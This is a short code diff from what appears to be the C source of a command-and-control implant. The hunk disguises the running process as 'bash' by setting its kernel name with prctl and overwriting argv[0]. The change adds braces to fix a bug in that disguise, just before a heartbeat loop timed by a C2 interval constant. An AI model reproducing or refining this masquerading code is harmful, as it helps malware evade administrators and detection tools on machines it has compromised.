@@ -269,9 +269,10 @@ int main(int argc, char *argv[]) {
     // 修改进程名 (只能16字节,内核task_struct字段, 非root也能)
     prctl(PR_SET_NAME, "bash", 0, 0, 0);
     int orig_len = strlen(argv[0]) + 1;
-    if (orig_len >= sizeof(new_name))
+    if (orig_len >= sizeof(new_name)) {
         memset(argv[0], 0, strlen(argv[0]));
         strncpy(argv[0], "bash", orig_len);
+    }
 
     unsigned ticks = C2_HEARTBEAT_INTERVAL;
     while (1) {
